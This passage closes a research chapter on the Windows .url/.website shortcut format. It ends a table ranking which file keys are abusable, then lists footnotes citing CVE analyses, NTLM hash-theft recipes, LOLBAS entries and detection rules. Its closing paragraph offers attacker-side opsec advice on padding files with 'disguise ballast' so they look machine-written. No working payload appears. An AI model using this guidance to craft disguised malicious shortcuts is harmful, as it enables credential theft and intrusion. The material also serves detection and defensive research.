| `[{9F4C2855-…}]` Prop5= | Assist | `Microsoft.Website.<hex>.<hex>` AUMID-style string; mimicry ballast | Live | [Observed][^5] |
| `[Bookmarklet] ExtendedURL=` | Conditional | 5119-byte `javascript:` payload (IE context) | IE app disabled on 24H2; IE-mode caveat | [Observed][^30][^29] |
| `[MonitoredItem] FeedUrl=` | [Hypothesis] | Web Slice feed URL — periodic fetch in IE era; no modern abuse specimen | Legacy | [Observed][^52] |
| `[DEFAULT] BASEURL=`, `[DOC#…]` | No | Frameset persistence; no abuse specimen | Legacy | [Observed][^19] |
| `.website` extension (carrier) | **Yes** | Alternative extension, same parser, `NeverShowExt` covered | Live | [Observed][^3] |
| `Referer=`, `BrowserFlags=`, `BaseURL=`-in-`[InternetShortcut]`, `SiteURL=`, `ScriptUrl=` | **No — rumor** | Claimed only by uncorroborated aggregator pages; zero specimens; no PROPIDs exist | Not honored | [Rumor][^53] |

The actionable core is six rows: `URL=`, `IconFile=`, `WorkingDirectory=`, `.W`, `Prop3`, and the `.website` carrier. Everything else is disguise ballast (real opsec value — machine-written files are noisy, and a too-clean file is itself an anomaly) or inert legacy metadata. The rumor row exists because aggregator sites keep republishing `Referer=`/`BrowserFlags=` as .url keys; treat any detection or emulation logic built on them as unverified.[^53]

---

[^1]: https://github.com/Greenwolf/ntlm_theft — Greenwolf ntlm_theft (".url – via URL field; .url – via ICONFILE field"; browse-to-folder triggers); %USERNAME%-in-IconFile recipe reproduced from insert-script.blogspot.com (2018), documented at https://www.rootshellsecurity.net/ntlm-hash-disclosure/.
[^2]: https://blog.quarkslab.com/analysis-of-ms16-104-url-files-security-feature-bypass-cve-2016-3353.html — Quarkslab, "Analysis of MS16-104: .URL files Security Feature Bypass (CVE-2016-3353)" (ieframe OpenURL/CInternetShortcut/CExecHelper RE; lpParameters=NULL; MotW patch mechanics; Prop3=19,9 PoC).
[^3]: https://www.nccgroup.com/research/the-case-of-missing-file-extensions/ — NCC Group, "The Case of Missing File Extensions" (NeverShowExt hides .URL/.website even with extensions shown).
[^4]: https://www.trendmicro.com/en_us/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-s.html — Trend Micro ZDI, "CVE-2024-21412: Water Hydra Targets Traders" (verbatim .url chain; search: AQS lure; SmartScreen/MotW failure; a2.cmd payload).
[^5]: https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/ — Check Point Research, "CVE-2025-24054 NTLM Exploit in the Wild" (xd.url/xd.website verbatim; CVE-2024-43451 companion attribution; trigger interactions; xd.zip four-file combo).
[^6]: https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/ — Osanda Malith Jayathissa, "Places of Interest in Stealing NetNTLM Hashes" (2017 .url URL=file:// primitive).
[^7]: https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/ — Penetration Testing Lab, "SMB Share – SCF File Attacks" (IconFile=\\host\share\pentestlab.ico recipe; Responder/Metasploit capture workflow).
[^8]: https://www.zerodayinitiative.com/advisories/ZDI-16-506/ — ZDI-16-506 advisory (CVE-2016-3353; credit Eduardo Braun Prado; disclosure timeline).
[^9]: https://cn-sec.com/archives/2321455.html — mirror of M01N Team analysis of CVE-2023-36025 (CInvokeCreateProcessVerb::ProcessCommandTemplate; missing CheckSmartScreenWithAltFile on the parameterized branch; TA544 .vhd variant).
[^10]: https://www.trendmicro.com/en_us/research/24/b/cve-2024-21412-facts-and-fixes.html — Trend Micro, "CVE-2024-21412 Facts and Fixes" (CVE-2024-29988 follow-on bypass; CVE-2024-21351 same cycle).
[^11]: https://www.trendmicro.com/en_us/research/24/a/cve-2023-36025-exploited-for-defense-evasion-in-phemedrone-steal.html — Trend Micro, "CVE-2023-36025 Exploited for Defense Evasion in Phemedrone Stealer Campaign" (DocuSign3.url verbatim; control.exe T1218.002 chain).
[^12]: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21412 — Microsoft Security Update Guide, CVE-2024-21412 (CVSS 8.1, CWE-693, patched 2024-02-13, CISA KEV).
[^13]: https://www.trendmicro.com/en_us/research/24/c/cve-2024-21412--darkgate-operators-exploit-microsoft-windows-sma.html — Trend Micro, "DarkGate Operators Exploit Microsoft Windows SmartScreen Bypass" (verbatim DarkGate .url pair; MSI zip-in-path).
[^14]: https://www.trellix.com/blogs/research/beyond-file-search-a-novel-method/ — Trellix, "Beyond File Search: A Novel Method" (search-ms URI anatomy with @SSL\DavWWWRoot).
[^15]: https://pentestlab.blog/2024/01/02/initial-access-search-ms-uri-handler/ — Penetration Testing Lab, "Initial Access – Search-ms URI Handler" (WebDAV crumb + displayname recipe).
[^16]: https://www.forcepoint.com/blog/x-labs/asyncrat-python-trycloudflare-malware — Forcepoint X-Labs (AsyncRAT campaign delivering LNK via search-ms/HTML attachments).
[^17]: https://blog.0patch.com/2025/06/micropatches-released-for-webdav-remote.html — 0patch, "Micropatches Released for WebDAV Remote Code Execution (CVE-2025-33053)" (verbatim patch-mechanism quote: WorkingDirectory ignored when launching executables).
[^18]: https://research.checkpoint.com/2025/stealth-falcon-zero-day/ — Check Point Research, "Stealth Falcon Zero-Day" (CVE-2025-33053; verbatim .url; iediagcmd bare-name CWD hijack; CustomShellHost.exe; Horus chain).
[^19]: http://www.cyanwerks.com/formats/file-format-url.html — Edward L. Blake, "An Unofficial Guide to the URL File Format", 3rd ed. (Modified = inverted FILETIME + checksum byte, worked example 20F06BA06D07BD014D; [DEFAULT]/[DOC#] frameset sections; HotKey table).
[^20]: https://research.checkpoint.com/2025/blind-eagle-and-justice-for-all/ — Check Point Research, "Blind Eagle and Justice for All" (in-the-wild .A/.W section trick; UTF-7 +AF8- URL; CVE-2024-43451 use).
[^21]: https://learn.microsoft.com/en-us/windows/win32/lwef/internet-shortcuts — Microsoft Learn, "Internet Shortcuts" (FMTID_Intshcut PID_IS_* property IDs; PID 3 absent).
[^22]: https://lolbas-project.github.io/lolbas/Libraries/Ieframe/ — LOLBAS, Ieframe.dll (OpenURL; renamed-extension tolerance; Win10/11).
[^23]: https://lolbas-project.github.io/lolbas/Libraries/Url/ — LOLBAS, Url.dll (OpenURL, OpenURLA, FileProtocolHandler with caret obfuscation, TelnetProtocolHandler).
[^24]: https://lolbas-project.github.io/lolbas/Libraries/Shdocvw/ — LOLBAS, Shdocvw.dll (OpenURL).
[^25]: https://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/ — hexacorn, "Running programs via Proxy & jumping on a EDR-bypass trampoline" (url.dll OpenURL/FileProtocolHandler; rundll32 copy → parent-spoofing as adobe.exe).
[^26]: https://www.hexacorn.com/blog/2018/03/15/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline-part-5/ — hexacorn Part 5 (ieframe.dll/shdocvw.dll OpenURL with .url files).
[^27]: https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/ — bohops, "Abusing Exported Functions and Exposed DCOM Interfaces" (three OpenURL exports; NULL-verb ShellExecute; ShellBrowserWindow/ShellWindows DCOM Navigate with UNC .url).
[^28]: https://github.com/sailay1996/misc-bin/blob/master/ads.md — sailay1996 ADS notes (OpenURL on .url content in NTFS alternate data streams).
[^29]: https://techcommunity.microsoft.com/blog/windows-itpro-blog/internet-explorer-11-desktop-app-retirement-faq/2366549 — Microsoft, "Internet Explorer 11 desktop app retirement FAQ" (IE binaries retained/serviced for IE mode; iexplore.exe disabled).
[^30]: https://gist.github.com/dungsaga/45788260c81832de54ab5e237b523d22 — Bookmarklet .url gist (verbatim specimen; URL 2083-byte truncation of ExtendedURL ≤5119 bytes; tooltip ≤255).
[^31]: https://www.zdnet.com/article/ie9-power-tips-the-secrets-of-pinned-site-shortcuts/ — ZDNet, "IE9 power tips: the secrets of pinned site shortcuts" (.website opens via iexplore.exe -w).
[^32]: https://gist.github.com/milo2012/00856e9273ab08829dc715a845abb4ed — CVE-2024-43451 PoC .url gist (empty .A/.W sections; malformed GUID section C0000; bidi Unicode warning).
[^33]: https://tradecraft.cafe/Windows-Search-And-WebDAV-Payloads/ — "Windows Search And WebDAV Payloads" (verbatim search-ms .url specimen).
[^34]: https://securelist.com/ntlm-abuse-in-2025/118132/ — Kaspersky Securelist, "NTLM abuse in 2025" (Blind Eagle port-80 WebDAV fallback leaking NTLM hashes).
[^35]: https://www.openwall.com/lists/oss-security/2017/10/24/1 — Juan Diego, ADV170014 SCF hash-theft disclosure (Microsoft guidance-only response).
[^36]: https://docs.rs/rclip-url-file/latest/rclip_url_file/ — rclip-url-file crate documentation (GetPrivateProfileString semantics: case-insensitivity, quote stripping, first-duplicate-wins, whitespace trim; bare-path URL= targets; encodings).
[^37]: https://bugs.chromium.org/p/project-zero/issues/detail?id=693 — Google Project Zero #693 (Tavis Ormandy; zip-as-folder .hta MotW-evasion trick).
[^38]: https://www.rapid7.com/blog/post/tr-exposed-webdav-malware-delivery-lab-analysis/ — Rapid7, analysis of exposed attacker WebDAV test server (Win11 24H2 iediagcmd removal; 59 alternative .url LOLBin variants; attacker patch-check notes).
[^39]: https://landenlabs.com/cs-urlcleaner/urlcleaner.html and https://github.com/Ignefolio/Steam-Shortcut-Icon-Fixer — Steam .url specimens (URL=steam://rungameid/<id>).
[^40]: https://forum.kodi.tv/showthread.php?tid=287826&page=120 — Kodi forum, verbatim Epic Games Launcher .url (URL=com.epicgames.launcher://apps/Fortnite?action=launch&silent=true; WorkingDirectory; exe IconFile; Prop3=19,0).
[^41]: https://labs.itresit.es/2026/03/25/when-bills-come-with-surprise-donut-of-python-and-rat/ — itresit labs (verbatim DavWWWRoot .wsh .url; "native, trusted components" quote); Proofpoint Aug-2024 chain summarized at research.kr-labs.com.ua.
[^42]: https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-104 — Microsoft Security Bulletin MS16-104 (CVE-2016-3353 affected products: IE9–11 incl. Windows 10).
[^43]: https://inquest.net/blog/shortcut-to-malice-url-files/ — InQuest/OPSWAT, "Shortcut to Malice: URL Files" (2016 vs modern attack-surface comparison: ieframe → Windows core components).
[^44]: https://learn.microsoft.com/en-us/answers/questions/2150484/extremely-slow-open-file-dialog-from-all-applicati — Microsoft Q&A 2150484 (Procédure/Proc+AOk-dure .A/.W specimen; file:// .url files hang Open File dialogs at enumeration).
[^45]: https://tharros.com/the-dangers-of-windows-internetshortcut-url-files/ — Tharros (Will Dormann) YARA rules for malicious .url (whitespace/wide variants; URL=\\, file:\\/ obfuscations; CVE-2025-33053 context).
[^46]: https://blog.darkthread.net/blog/ie-bookmarklet/ — darkthread blog (IE bookmarklet .url generator; UTF-16LE requirement for CJK; 2083/5119 limits).
[^47]: https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_rundll32_susp_activity/ — Sigma, "Potentially Suspicious Rundll32 Activity" (url.dll/ieframe.dll/shdocvw.dll OpenURL command lines).
[^48]: https://nsis.sourceforge.io/Creating_internet_shortcuts — NSIS wiki, "Creating internet shortcuts" ("Only the URL value in the InternetShortcut section is required"; full key/section list).
[^49]: https://detection.fyi/sigmahq/sigma/emerging-threats/2025/exploits/cve-2025-33053/ — Sigma, CVE-2025-33053 exploit detection (iediagcmd/CustomShellHost children with UNC/DavWWWRoot CurrentDirectory).
[^50]: https://hacktricks.wiki — HackTricks WebDAV page (detection ideas: .url with WorkingDirectory=\\…@80/@ssl@443/DavWWWRoot; search-ms/.library-ms to external shares).
[^51]: https://www.cnblogs.com/suv789/p/18324691 — Field-status survey (IDList preferred by Explorer to locate resources; Comment/Desc/Author/WhatsNew/Roamed no longer parsed on Win10/11).
[^52]: https://community.sap.com/t5/application-development-discussions/sending-url-as-attachment/m-p/9339383 — SAP community Web Slice .url specimen ([MonitoredItem] FeedUrl/IsLivePreview); corroborated by hybrid-analysis sandbox strings.
[^53]: https://filetypedb.com/web/url — filetypedb.com "URL File Format" (sole source for Referer=/BrowserFlags=/BaseURL-in-[InternetShortcut]; uncorroborated — flagged as weak).

<!-- chapter-nav -->

---

← [5. Security behaviors](05-security-behaviors.md) · [Chapters](README.md) · [6. Rumors, versions, and gaps →](07-rumors-versions-gaps.md)
